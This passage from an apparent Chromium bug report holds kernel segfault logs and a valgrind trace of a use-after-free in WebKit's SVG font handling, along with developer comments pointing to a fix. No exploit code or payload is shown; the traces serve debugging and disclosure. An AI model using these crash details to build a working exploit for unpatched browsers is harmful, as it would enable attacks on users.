Dec 28 17:43:20  kernel: [89737.151128] RAX: 0000000003950cc0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:20  kernel: [89737.272169] chrome[21996]: segfault at 0 ip (null) sp 00007fffa91ef3f8 error 14 in chrome[400000+2e3c000]
Dec 28 17:43:20  kernel: [89737.272225] RAX: 0000000003950ce0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:20  kernel: [89737.418471] chrome[21999]: segfault at 0 ip (null) sp 00007fffa91ef3f8 error 14 in chrome[400000+2e3c000]
Dec 28 17:43:20  kernel: [89737.418528] RAX: 0000000003950ca0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:21  kernel: [89737.570799] chrome[22002]: segfault at 0 ip (null) sp 00007fffa91ef3f8 error 14 in chrome[400000+2e3c000]
Dec 28 17:43:21  kernel: [89737.570854] RAX: 0000000003950ca0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:21  kernel: [89737.707441] chrome[22005]: segfault at 0 ip (null) sp 00007fffa91ef3f8 error 14 in chrome[400000+2e3c000]
Dec 28 17:43:21  kernel: [89737.707495] RAX: 0000000003950ce0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:21  kernel: [89737.866472] chrome[22008]: segfault at 0 ip (null) sp 00007fffa91ef3f8 error 14 in chrome[400000+2e3c000]
Dec 28 17:43:21  kernel: [89737.866529] RAX: 0000000003950ca0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:21  kernel: [89738.009041] chrome[22011]: segfault at 0 ip (null) sp 00007fffa91ef3f8 error 14 in chrome[400000+2e3c000]
Dec 28 17:43:21  kernel: [89738.009094] RAX: 0000000003950ca0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:21  kernel: [89738.154093] chrome[22014]: segfault at 0 ip (null) sp 00007fffa91ef3f8 error 14 in chrome[400000+2e3c000]
Dec 28 17:43:21  kernel: [89738.154149] RAX: 0000000003950ca0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:21  kernel: [89738.296047] RAX: 0000000003950ca0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:21  kernel: [89738.447284] RAX: 0000000003950ca0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:22  kernel: [89738.594208] RAX: 0000000003950ca0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:22  kernel: [89738.736337] RAX: 0000000003950ce0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:22  kernel: [89738.905834] RAX: 0000000003950ca0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:22  kernel: [89739.037509] RAX: 0000000003950ce0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:22  kernel: [89739.206401] RAX: 0000000003950ce0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:22  kernel: [89739.352903] RAX: 0000000003950ca0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:23  kernel: [89739.494694] RAX: 0000000003950ca0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:25  kernel: [89741.943881] RAX: 0000000003950ce0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:25  kernel: [89742.418484] chrome[22048]: segfault at 7f4ec2387051 ip 00007f4ec2387051 sp 00007fffa91ef3f8 error 15
Dec 28 17:43:25  kernel: [89742.418535] RAX: 0000000003950ce0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:26  kernel: [89742.952074] chrome[22051]: segfault at 0 ip (null) sp 00007fffa91ef3f8 error 14 in chrome[400000+2e3c000]
Dec 28 17:43:26  kernel: [89742.952150] RAX: 0000000003950cc0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:26  kernel: [89743.433553] chrome[22054]: segfault at 0 ip (null) sp 00007fffa91ef3f8 error 14 in chrome[400000+2e3c000]
Dec 28 17:43:26  kernel: [89743.433607] RAX: 0000000003950ca0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:27  kernel: [89743.901514] chrome[22057]: segfault at 0 ip (null) sp 00007fffa91ef3f8 error 14 in chrome[400000+2e3c000]
Dec 28 17:43:27  kernel: [89743.901568] RAX: 0000000003950ca0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:27  kernel: [89744.339682] chrome[22060]: segfault at 0 ip (null) sp 00007fffa91ef3f8 error 14 in chrome[400000+2e3c000]
Dec 28 17:43:27  kernel: [89744.339741] RAX: 0000000003950ca0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:28  kernel: [89744.752089] chrome[22063]: segfault at 0 ip (null) sp 00007fffa91ef3f8 error 14 in chrome[400000+2e3c000]
Dec 28 17:43:28  kernel: [89744.752147] RAX: 0000000003950ca0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:28  kernel: [89745.219012] chrome[22066]: segfault at 0 ip (null) sp 00007fffa91ef3f8 error 14 in chrome[400000+2e3c000]
Dec 28 17:43:28  kernel: [89745.219065] RAX: 0000000003950ca0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:29  kernel: [89745.579908] chrome[22069]: segfault at 0 ip (null) sp 00007fffa91ef3f8 error 14 in chrome[400000+2e3c000]
Dec 28 17:43:29  kernel: [89745.579962] RAX: 0000000003950ca0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:29  kernel: [89746.006116] chrome[22072]: segfault at 0 ip (null) sp 00007fffa91ef3f8 error 14 in chrome[400000+2e3c000]
Dec 28 17:43:29  kernel: [89746.006172] RAX: 0000000003950ca0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:29  kernel: [89746.371137] chrome[22075]: segfault at 0 ip (null) sp 00007fffa91ef3f8 error 14 in chrome[400000+2e3c000]
Dec 28 17:43:29  kernel: [89746.371194] RAX: 0000000003950ca0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:30  kernel: [89746.715924] RAX: 0000000003950ca0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:30  kernel: [89747.059016] RAX: 0000000003950ca0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:30  kernel: [89747.374674] RAX: 0000000003950ca0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:31  kernel: [89747.679064] RAX: 0000000003950ca0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:31  kernel: [89748.091831] chrome[22090]: segfault at 0 ip (null) sp 00007fffa91ef3f8 error 14 in chrome[400000+2e3c000]
Dec 28 17:43:31  kernel: [89748.091941] RAX: 0000000003950ca0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:31  kernel: [89748.387097] chrome[22093]: segfault at 0 ip (null) sp 00007fffa91ef3f8 error 14 in chrome[400000+2e3c000]
Dec 28 17:43:31  kernel: [89748.387151] RAX: 0000000003950ca0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:32  kernel: [89748.704160] chrome[22096]: segfault at 0 ip (null) sp 00007fffa91ef3f8 error 14 in chrome[400000+2e3c000]
Dec 28 17:43:32  kernel: [89748.704213] RAX: 0000000003950ca0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:32  kernel: [89748.989170] chrome[22099]: segfault at 0 ip (null) sp 00007fffa91ef3f8 error 14 in chrome[400000+2e3c000]
Dec 28 17:43:32  kernel: [89748.989224] RAX: 0000000003950cc0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:32  kernel: [89749.256105] chrome[22102]: segfault at 0 ip (null) sp 00007fffa91ef3f8 error 14 in chrome[400000+2e3c000]
Dec 28 17:43:32  kernel: [89749.256164] RAX: 0000000003950cc0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:33  kernel: [89749.575916] chrome[22105]: segfault at 0 ip (null) sp 00007fffa91ef3f8 error 14 in chrome[400000+2e3c000]
Dec 28 17:43:33  kernel: [89749.575975] RAX: 0000000003950cc0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:33  kernel: [89749.804057] chrome[22108]: segfault at 0 ip (null) sp 00007fffa91ef3f8 error 14 in chrome[400000+2e3c000]
Dec 28 17:43:33  kernel: [89749.804124] RAX: 0000000003950cc0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:43  kernel: [89760.068826] chrome[22111]: segfault at 0 ip (null) sp 00007fffa91ef3f8 error 14 in chrome[400000+2e3c000]
Dec 28 17:43:43  kernel: [89760.068938] RAX: 0000000003950ca0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:44  kernel: [89760.541791] chrome[22114]: segfault at 0 ip (null) sp 00007fffa91ef3f8 error 14 in chrome[400000+2e3c000]
Dec 28 17:43:44  kernel: [89760.541848] RAX: 0000000003950cc0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:44  kernel: [89760.848616] chrome[22117]: segfault at 0 ip (null) sp 00007fffa91ef3f8 error 14 in chrome[400000+2e3c000]
Dec 28 17:43:44  kernel: [89760.848680] RAX: 0000000003950ca0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:44  kernel: [89761.191809] chrome[22120]: segfault at 0 ip (null) sp 00007fffa91ef3f8 error 14 in chrome[400000+2e3c000]
Dec 28 17:43:44  kernel: [89761.191865] RAX: 0000000003950cc0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:45  kernel: [89761.539103] chrome[22123]: segfault at 0 ip (null) sp 00007fffa91ef3f8 error 14 in chrome[400000+2e3c000]
Dec 28 17:43:45  kernel: [89761.539156] RAX: 0000000003950ca0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:45  kernel: [89761.822006] chrome[22126]: segfault at 0 ip (null) sp 00007fffa91ef3f8 error 14 in chrome[400000+2e3c000]
Dec 28 17:43:45  kernel: [89761.822059] RAX: 0000000003950ca0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:45  kernel: [89762.098406] chrome[22129]: segfault at 7f4ec2387051 ip 00007f4ec2387051 sp 00007fffa91ef3f8 error 15
Dec 28 17:43:45  kernel: [89762.098459] RAX: 0000000003950ce0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:49  kernel: [89765.503248] chrome[22132]: segfault at 0 ip (null) sp 00007fffa91ef3f8 error 14 in chrome[400000+2e3c000]
Dec 28 17:43:49  kernel: [89765.503362] RAX: 0000000003950ce0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:49  kernel: [89766.081010] chrome[22135]: segfault at 0 ip (null) sp 00007fffa91ef3f8 error 14 in chrome[400000+2e3c000]
Dec 28 17:43:49  kernel: [89766.081064] RAX: 0000000003950ca0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:50  kernel: [89766.589849] chrome[22138]: segfault at 0 ip (null) sp 00007fffa91ef3f8 error 14 in chrome[400000+2e3c000]
Dec 28 17:43:50  kernel: [89766.589903] RAX: 0000000003950ca0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:50  kernel: [89767.054918] chrome[22141]: segfault at 0 ip (null) sp 00007fffa91ef3f8 error 14 in chrome[400000+2e3c000]
Dec 28 17:43:50  kernel: [89767.054974] RAX: 0000000003950ca0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:51  kernel: [89767.492542] chrome[22144]: segfault at 0 ip (null) sp 00007fffa91ef3f8 error 14 in chrome[400000+2e3c000]
Dec 28 17:43:51  kernel: [89767.492595] RAX: 0000000003950ca0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:51  kernel: [89767.910897] chrome[22147]: segfault at 0 ip (null) sp 00007fffa91ef3f8 error 14 in chrome[400000+2e3c000]
Dec 28 17:43:51  kernel: [89767.910959] RAX: 0000000003950ce0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:51  kernel: [89768.337209] chrome[22150]: segfault at 7f4ec2387051 ip 00007f4ec2387051 sp 00007fffa91ef3f8 error 15
Dec 28 17:43:51  kernel: [89768.337262] RAX: 0000000003950ce0 RBX: 0000000003873870 RCX: 000000000383f060
Dec 28 17:43:52  kernel: [89768.659215] chrome[22153]: segfault at 0 ip (null) sp 00007fffa91ef3f8 error 14 in chrome[400000+2e3c000]
Dec 28 17:43:52  kernel: [89768.659270] RAX: 0000000003950ce0 RBX: 0000000003873870 RCX: 000000000383f060
 


### mi...@gmail.com (2010-12-28)

and here is chromium 10.0.623:

Dec 28 18:03:37  kernel: [90951.184124] chromium-browse[23631]: segfault at 100000481 ip 00007f6faa7fe6bf sp 00007fffe02fbd20 error 4 in chromium-browser[7f6fa8fe2000+31ce000]
Dec 28 18:03:37  kernel: [90951.184184] RAX: 0000000100000001 RBX: 00007f6fae2a0ca0 RCX: 00007f6fae2ad0c0
Dec 28 18:03:37  kernel: [90951.450038] chromium-browse[23634]: segfault at 100000001 ip 0000000100000001 sp 00007fffe02fbcf8 error 14 in Times_New_Roman.ttf[7f6f98f18000+51000]
Dec 28 18:03:37  kernel: [90951.450098] RAX: 00007f6fadebe2e0 RBX: 00007f6fade1f6c0 RCX: 00007f6fae189540
Dec 28 18:03:38  kernel: [90951.652079] chromium-browse[23637]: segfault at 100000001 ip 0000000100000001 sp 00007fffe02fbcf8 error 14 in Times_New_Roman.ttf[7f6f98f18000+51000]
Dec 28 18:03:38  kernel: [90951.652138] RAX: 00007f6fadebd2c0 RBX: 00007f6fade1f6c0 RCX: 00007f6fadec4150
Dec 28 18:03:38  kernel: [90951.835449] chromium-browse[23640]: segfault at 0 ip (null) sp 00007fffe02fbcf8 error 14 in Times_New_Roman.ttf[7f6f98f18000+51000]
Dec 28 18:03:38  kernel: [90951.835563] RAX: 00007f6fadebe2c0 RBX: 00007f6fade1f6c0 RCX: 00007f6fae181450
Dec 28 18:03:38  kernel: [90952.010722] chromium-browse[23643]: segfault at 43e00000810 ip 00007f6faabeb3ca sp 00007fffe02fbbd0 error 4 in chromium-browser[7f6fa8fe2000+31ce000]
Dec 28 18:03:38  kernel: [90952.010839] RAX: 0000000000000081 RBX: 00007f6fadebea08 RCX: 0000000046a38cc1
Dec 28 18:03:38  kernel: [90952.202399] chromium-browse[23646]: segfault at 100000481 ip 00007f6faa7fe6bf sp 00007fffe02fbd20 error 4 in chromium-browser[7f6fa8fe2000+31ce000]
Dec 28 18:03:38  kernel: [90952.202458] RAX: 0000000100000001 RBX: 00007f6fae29fc80 RCX: 00007f6fae2ad0c0
Dec 28 18:03:38  kernel: [90952.368414] chromium-browse[23649]: segfault at 100000001 ip 0000000100000001 sp 00007fffe02fbcf8 error 14 in Times_New_Roman.ttf[7f6f98f18000+51000]
Dec 28 18:03:38  kernel: [90952.368474] RAX: 00007f6fadebc2e0 RBX: 00007f6fade1f6c0 RCX: 00007f6fae187540
Dec 28 18:03:38  kernel: [90952.558262] chromium-browse[23652]: segfault at 100000001 ip 0000000100000001 sp 00007fffe02fbcf8 error 14 in Times_New_Roman.ttf[7f6f98f18000+51000]
Dec 28 18:03:38  kernel: [90952.558322] RAX: 00007f6fadebc2e0 RBX: 00007f6fade1f6c0 RCX: 00007f6fae181510
Dec 28 18:03:39  kernel: [90952.745295] chromium-browse[23655]: segfault at 0 ip (null) sp 00007fffe02fbcf8 error 14 in Times_New_Roman.ttf[7f6f98f18000+51000]
Dec 28 18:03:39  kernel: [90952.745352] RAX: 00007f6fadebe2c0 RBX: 00007f6fade1f6c0 RCX: 00007f6fae181450
Dec 28 18:03:39  kernel: [90952.939395] chromium-browse[23658]: segfault at 0 ip (null) sp 00007fffe02fbcf8 error 14 in Times_New_Roman.ttf[7f6f98f18000+51000]
Dec 28 18:03:39  kernel: [90952.939509] RAX: 00007f6fadebd2c0 RBX: 00007f6fade1f6c0 RCX: 00007f6fae1814e0
Dec 28 18:03:39  kernel: [90953.131781] RAX: 0000000100000001 RBX: 00007f6fae2a0c80 RCX: 00007f6fae2a6960
Dec 28 18:03:39  kernel: [90953.305068] RAX: 00007f6fadebd2c0 RBX: 00007f6fade1f6c0 RCX: 00007f6fadec5180
Dec 28 18:03:39  kernel: [90953.476117] RAX: 00007f6fadebd2c0 RBX: 00007f6fade1f6c0 RCX: 00007f6fadec4150
Dec 28 18:03:40  kernel: [90953.658788] RAX: 0000000000000081 RBX: 00007f6fadebfa28 RCX: 0000000046a38cc1
Dec 28 18:03:40  kernel: [90953.831516] RAX: 00007f6fadebe2c0 RBX: 00007f6fade1f6c0 RCX: 00007f6fadec4120
Dec 28 18:03:40  kernel: [90954.030124] RAX: 0000000100000001 RBX: 00007f6fae2a0c80 RCX: 00007f6fae2a6960
Dec 28 18:03:40  kernel: [90954.199403] RAX: 00007f6fadebd2c0 RBX: 00007f6fade1f6c0 RCX: 00007f6fadec5180
Dec 28 18:03:40  kernel: [90954.359423] RAX: 00007f6fadebd2c0 RBX: 00007f6fade1f6c0 RCX: 00007f6fadec4150
Dec 28 18:03:40  kernel: [90954.543929] RAX: 0000000000000081 RBX: 00007f6fadebea08 RCX: 0000000046a38cc1
Dec 28 18:03:41  kernel: [90954.731780] RAX: 0000000000000081 RBX: 00007f6fadebea28 RCX: 0000000046a38cc1
Dec 28 18:03:41  kernel: [90954.910044] RAX: 0000000100000001 RBX: 00007f6fae2a0c80 RCX: 00007f6fae2a6960
Dec 28 18:03:41  kernel: [90955.072423] RAX: 00007f6fadebd2c0 RBX: 00007f6fade1f6c0 RCX: 00007f6fadec5180
Dec 28 18:03:41  kernel: [90955.253311] RAX: 00007f6fadebc2e0 RBX: 00007f6fade1f6c0 RCX: 00007f6fae181510
Dec 28 18:03:41  kernel: [90955.424431] RAX: 0000000100000001 RBX: 00007f6fae1616c0 RCX: 00007f6fadec72d0
Dec 28 18:03:41  kernel: [90955.627170] RAX: 0000000000000081 RBX: 00007f6fadebea28 RCX: 0000000046a38cc1
Dec 28 18:03:42  kernel: [90955.813824] RAX: 0000000100000001 RBX: 00007f6fae2a0c80 RCX: 00007f6fae2a6960
Dec 28 18:03:42  kernel: [90955.966125] RAX: 00007f6fadebd2c0 RBX: 00007f6fade1f6c0 RCX: 00007f6fadec5180
Dec 28 18:03:42  kernel: [90956.137787] RAX: 00007f6fadebd2c0 RBX: 00007f6fade1f6c0 RCX: 00007f6fadec4150
Dec 28 18:03:42  kernel: [90956.289107] RAX: 00007f6fadebe2c0 RBX: 00007f6fade1f6c0 RCX: 00007f6fae181450
Dec 28 18:03:42  kernel: [90956.456791] chromium-browse[23718]: segfault at 43e00000810 ip 00007f6faabeb3ca sp 00007fffe02fbbd0 error 4 in chromium-browser[7f6fa8fe2000+31ce000]
Dec 28 18:03:42  kernel: [90956.456849] RAX: 0000000000000081 RBX: 00007f6fadebea28 RCX: 0000000046a38cc1
Dec 28 18:03:48  kernel: [90962.470957] chromium-browse[23721]: segfault at 100000481 ip 00007f6faa7fe6bf sp 00007fffe02fbd20 error 4 in chromium-browser[7f6fa8fe2000+31ce000]
Dec 28 18:03:48  kernel: [90962.471017] RAX: 0000000100000001 RBX: 00007f6fae2a0c80 RCX: 00007f6fae2a6960
Dec 28 18:03:49  kernel: [90962.681469] chromium-browse[23724]: segfault at 100000001 ip 0000000100000001 sp 00007fffe02fbcf8 error 14 in Times_New_Roman.ttf[7f6f98f18000+51000]
Dec 28 18:03:49  kernel: [90962.681529] RAX: 00007f6fadebd2c0 RBX: 00007f6fade1f6c0 RCX: 00007f6fadec5180
Dec 28 18:03:49  kernel: [90962.880913] chromium-browse[23727]: segfault at 100000001 ip 0000000100000001 sp 00007fffe02fbcf8 error 14 in Times_New_Roman.ttf[7f6f98f18000+51000]
Dec 28 18:03:49  kernel: [90962.880974] RAX: 00007f6fadebd2c0 RBX: 00007f6fade1f6c0 RCX: 00007f6fadec4150
Dec 28 18:03:49  kernel: [90963.058503] chromium-browse[23730]: segfault at 43e00000810 ip 00007f6faabeb3ca sp 00007fffe02fbbd0 error 4 in chromium-browser[7f6fa8fe2000+31ce000]
Dec 28 18:03:49  kernel: [90963.058563] RAX: 0000000000000081 RBX: 00007f6fadebfa28 RCX: 0000000046a38cc1
Dec 28 18:03:49  kernel: [90963.260847] chromium-browse[23733]: segfault at 43e00000810 ip 00007f6faabeb3ca sp 00007fffe02fbbd0 error 4 in chromium-browser[7f6fa8fe2000+31ce000]
Dec 28 18:03:49  kernel: [90963.260907] RAX: 0000000000000081 RBX: 00007f6fadebea28 RCX: 0000000046a38cc1
Dec 28 18:03:49  kernel: [90963.441018] chromium-browse[23736]: segfault at 100000481 ip 00007f6faa7fe6bf sp 00007fffe02fbd20 error 4 in chromium-browser[7f6fa8fe2000+31ce000]
Dec 28 18:03:49  kernel: [90963.441075] RAX: 0000000100000001 RBX: 00007f6fae29fca0 RCX: 00007f6fae2ad0c0
Dec 28 18:03:49  kernel: [90963.612517] chromium-browse[23739]: segfault at 100000001 ip 0000000100000001 sp 00007fffe02fbcf8 error 14 in Times_New_Roman.ttf[7f6f98f18000+51000]
Dec 28 18:03:49  kernel: [90963.612577] RAX: 00007f6fadebd2c0 RBX: 00007f6fade1f6c0 RCX: 00007f6fadec5180
Dec 28 18:03:50  kernel: [90963.792378] chromium-browse[23742]: segfault at 100000001 ip 0000000100000001 sp 00007fffe02fbcf8 error 14 in Times_New_Roman.ttf[7f6f98f18000+51000]
Dec 28 18:03:50  kernel: [90963.792456] RAX: 00007f6fadebd2c0 RBX: 00007f6fade1f6c0 RCX: 00007f6fae182510
Dec 28 18:03:50  kernel: [90963.977267] chromium-browse[23745]: segfault at 43e00000810 ip 00007f6faabeb3ca sp 00007fffe02fbbd0 error 4 in chromium-browser[7f6fa8fe2000+31ce000]
Dec 28 18:03:50  kernel: [90963.977384] RAX: 0000000000000081 RBX: 00007f6fadebea28 RCX: 0000000046a38cc1
Dec 28 18:03:50  kernel: [90964.187403] RAX: 0000000100000001 RBX: 00007f6fae29fca0 RCX: 00007f6fae2ad0c0
Dec 28 18:03:50  kernel: [90964.326685] RAX: 00007f6fadebc2c0 RBX: 00007f6fade1f6c0 RCX: 00007f6fadec4180
Dec 28 18:03:50  kernel: [90964.536653] RAX: 00007f6fadebd2c0 RBX: 00007f6fade1f6c0 RCX: 00007f6fadec4150
Dec 28 18:03:51  kernel: [90964.739727] RAX: 00007f6fadebf2c0 RBX: 00007f6fade1f6c0 RCX: 00007f6fae183450



### sk...@chromium.org (2010-12-28)

That does nothing for me, but I am testing on Windows, which is ia32 only.
It seems from your log that RAX is always 0000000003950ce0. If this is truly memory corruption, one would expect various values. Anyway, I'll leave this to Justin - he may have access to an x64 linux machine :)

### sk...@chromium.org (2010-12-28)

(Sorry, I had obviously missed https://crbug.com/chromium/68120#c8)

### js...@chromium.org (2010-12-28)

Thanks for the report. The problem is a stale pointer where SVGElementInstance::m_useElement didn't get cleared after referenced use element was destroyed. We've already received another report on this a little over a week ago, and last Friday I landed a fix on WebKit trunk <http://trac.webkit.org/changeset/74636>. The fix hasn't made it into any shipping versions of Chrome, but you should see it in any upcoming releases on their respective channels.

### mi...@gmail.com (2011-01-07)

hi,

I checked out the webkit git and built chrome with rev 70632 and I still get this with 14l.html and valgrind.  (The segfault is at 0x498 or 0x499.)

~/chromium/src % out/Debug/chrome --renderer-cmd-prefix='/home/user/chromium/src/tools/valgrind/valgrind.sh' ~/chrome/14l.html
Using valgrind binaries from /home/user/chromium/src/third_party/valgrind/linux_x64

[31442:31442:433363277499:WARNING:chrome_main.cc(313)] process type 'renderer' should go through the zygote.
[31414:31420:433371664213:WARNING:plugin_lib_posix.cc(113)] /usr/lib/flashplugin-installer/libflashplayer.so is nspluginwrapper wrapping a plugin for a different architecture; it will work better if you instead use a native plugin.
==31442== Invalid read of size 8
==31442==    at 0x2C8EEDE: WebCore::SVGFontFaceElement::horizontalOriginX() const (SVGFontFaceElement.cpp:140)
==31442==    by 0x2C89FE3: WebCore::SVGFontData::SVGFontData(WebCore::SVGFontFaceElement*) (SVGFontData.cpp:34)
==31442==    by 0x2C0DE3B: WebCore::CSSFontFaceSource::getFontData(WebCore::FontDescription const&, bool, bool, WebCore::CSSFontSelector*) (CSSFontFaceSource.cpp:171)
==31442==    by 0x2C0A9A6: WebCore::CSSFontFace::getFontData(WebCore::FontDescription const&, bool, bool) (CSSFontFace.cpp:112)
==31442==    by 0x2B635D3: WebCore::CSSSegmentedFontFace::getFontData(WebCore::FontDescription const&) (CSSSegmentedFontFace.cpp:106)
==31442==    by 0x2B48FB4: WebCore::CSSFontSelector::getFontData(WebCore::FontDescription const&, WTF::AtomicString const&) (CSSFontSelector.cpp:543)
==31442==    by 0x24704F7: WebCore::FontCache::getFontData(WebCore::Font const&, int&, WebCore::FontSelector*) (FontCache.cpp:386)
==31442==    by 0x247BC5C: WebCore::FontFallbackList::fontDataAt(WebCore::Font const*, unsigned int) const (FontFallbackList.cpp:105)
==31442==    by 0x20F1A73: WebCore::FontFallbackList::primaryFontData(WebCore::Font const*) const (FontFallbackList.h:66)
==31442==    by 0x247BA82: WebCore::FontFallbackList::determinePitch(WebCore::Font const*) const (FontFallbackList.cpp:76)
==31442==    by 0x29C6DD0: WebCore::FontFallbackList::isFixedPitch(WebCore::Font const*) const (FontFallbackList.h:47)
==31442==    by 0x29C6E53: WebCore::Font::isFixedPitch() const (Font.h:277)
==31442==  Address 0x114c1c90 is 144 bytes inside a block of size 152 free'd
==31442==    at 0x698FEA6: free (vg_replace_malloc.c:913)
==31442==    by 0x2402530: WTF::fastFree(void*) (FastMalloc.cpp:327)
==31442==    by 0x20D8290: WTF::FastAllocBase::operator delete(void*) (FastAllocBase.h:121)
==31442==    by 0x2C9016D: WebCore::SVGFontFaceElement::~SVGFontFaceElement() (SVGFontFaceElement.h:34)
==31442==    by 0x26A3426: void WebCore::removeAllChildrenInContainer<WebCore::Node, WebCore::ContainerNode>(WebCore::ContainerNode*) (ContainerNodeAlgorithms.h:64)
==31442==    by 0x269E901: WebCore::ContainerNode::removeAllChildren() (ContainerNode.cpp:72)
==31442==    by 0x269EBA8: WebCore::ContainerNode::~ContainerNode() (ContainerNode.cpp:97)
==31442==    by 0x26EC1FB: WebCore::Element::~Element() (Element.cpp:80)
==31442==    by 0x274665A: WebCore::StyledElement::~StyledElement() (StyledElement.cpp:120)
==31442==    by 0x2C6A547: WebCore::SVGElement::~SVGElement() (SVGElement.cpp:84)
==31442==    by 0x2CC356C: WebCore::SVGStyledElement::~SVGStyledElement() (SVGStyledElement.cpp:68)
==31442==    by 0x2CA28DC: WebCore::SVGStyledLocatableElement::~SVGStyledLocatableElement() (SVGStyledLocatableElement.h:33)
==31442== 
==31442== 
==31442== ---- Attach to debugger ? --- [Return/N/n/Y/y/C/c] ---- n
==31442== Invalid read of size 8
==31442==    at 0x2C8EEF5: WebCore::SVGFontFaceElement::horizontalOriginX() const (SVGFontFaceElement.cpp:146)
==31442==    by 0x2C89FE3: WebCore::SVGFontData::SVGFontData(WebCore::SVGFontFaceElement*) (SVGFontData.cpp:34)
==31442==    by 0x2C0DE3B: WebCore::CSSFontFaceSource::getFontData(WebCore::FontDescription const&, bool, bool, WebCore::CSSFontSelector*) (CSSFontFaceSource.cpp:171)
==31442==    by 0x2C0A9A6: WebCore::CSSFontFace::getFontData(WebCore::FontDescription const&, bool, bool) (CSSFontFace.cpp:112)
==31442==    by 0x2B635D3: WebCore::CSSSegmentedFontFace::getFontData(WebCore::FontDescription const&) (CSSSegmentedFontFace.cpp:106)
==31442==    by 0x2B48FB4: WebCore::CSSFontSelector::getFontData(WebCore::FontDescription const&, WTF::AtomicString const&) (CSSFontSelector.cpp:543)
==31442==    by 0x24704F7: WebCore::FontCache::getFontData(WebCore::Font const&, int&, WebCore::FontSelector*) (FontCache.cpp:386)
==31442==    by 0x247BC5C: WebCore::FontFallbackList::fontDataAt(WebCore::Font const*, unsigned int) const (FontFallbackList.cpp:105)
==31442==    by 0x20F1A73: WebCore::FontFallbackList::primaryFontData(WebCore::Font const*) const (FontFallbackList.h:66)
==31442==    by 0x247BA82: WebCore::FontFallbackList::determinePitch(WebCore::Font const*) const (FontFallbackList.cpp:76)
==31442==    by 0x29C6DD0: WebCore::FontFallbackList::isFixedPitch(WebCore::Font const*) const (FontFallbackList.h:47)
==31442==    by 0x29C6E53: WebCore::Font::isFixedPitch() const (Font.h:277)
==31442==  Address 0x114c1c90 is 144 bytes inside a block of size 152 free'd
==31442==    at 0x698FEA6: free (vg_replace_malloc.c:913)
==31442==    by 0x2402530: WTF::fastFree(void*) (FastMalloc.cpp:327)
==31442==    by 0x20D8290: WTF::FastAllocBase::operator delete(void*) (FastAllocBase.h:121)
==31442==    by 0x2C9016D: WebCore::SVGFontFaceElement::~SVGFontFaceElement() (SVGFontFaceElement.h:34)
==31442==    by 0x26A3426: void WebCore::removeAllChildrenInContainer<WebCore::Node, WebCore::ContainerNode>(WebCore::ContainerNode*) (ContainerNodeAlgorithms.h:64)
==31442==    by 0x269E901: WebCore::ContainerNode::removeAllChildren() (ContainerNode.cpp:72)
==31442==    by 0x269EBA8: WebCore::ContainerNode::~ContainerNode() (ContainerNode.cpp:97)
==31442==    by 0x26EC1FB: WebCore::Element::~Element() (Element.cpp:80)
==31442==    by 0x274665A: WebCore::StyledElement::~StyledElement() (StyledElement.cpp:120)
==31442==    by 0x2C6A547: WebCore::SVGElement::~SVGElement() (SVGElement.cpp:84)
==31442==    by 0x2CC356C: WebCore::SVGStyledElement::~SVGStyledElement() (SVGStyledElement.cpp:68)
==31442==    by 0x2CA28DC: WebCore::SVGStyledLocatableElement::~SVGStyledLocatableElement() (SVGStyledLocatableElement.h:33)
==31442== 
==31442== 
